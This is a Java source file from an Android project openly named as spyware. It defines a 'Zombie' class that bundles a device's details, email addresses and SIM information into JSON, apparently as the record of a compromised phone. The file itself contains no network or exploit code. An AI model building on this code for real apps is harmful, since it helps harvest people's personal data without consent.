package android.spyware.model;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.Map;

import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class Zombie {
    private Map<String, String> device;
    private List<String>        email_addresses;
    private Map<String, String> SIM;

    public Zombie(Map<String, String> device, List<String> email_addresses, Map<String, String> SIM) {
        this.device = device;
        this.email_addresses = email_addresses;
        this.SIM = SIM;
    }

    public JSONObject toJSON() {
        JSONObject JSONZombie = new JSONObject();

        try {
            JSONZombie.put("device", this.device);
            JSONZombie.put("email_addresses", new JSONArray(this.email_addresses));
            JSONZombie.put("SIM", this.SIM);
        } catch (JSONException ex) {
            Log.wtf(TAG, Zombie.class.getName() + "->toJSON: " + Log.getStackTraceString(ex));
        }

        return JSONZombie;
    }
}
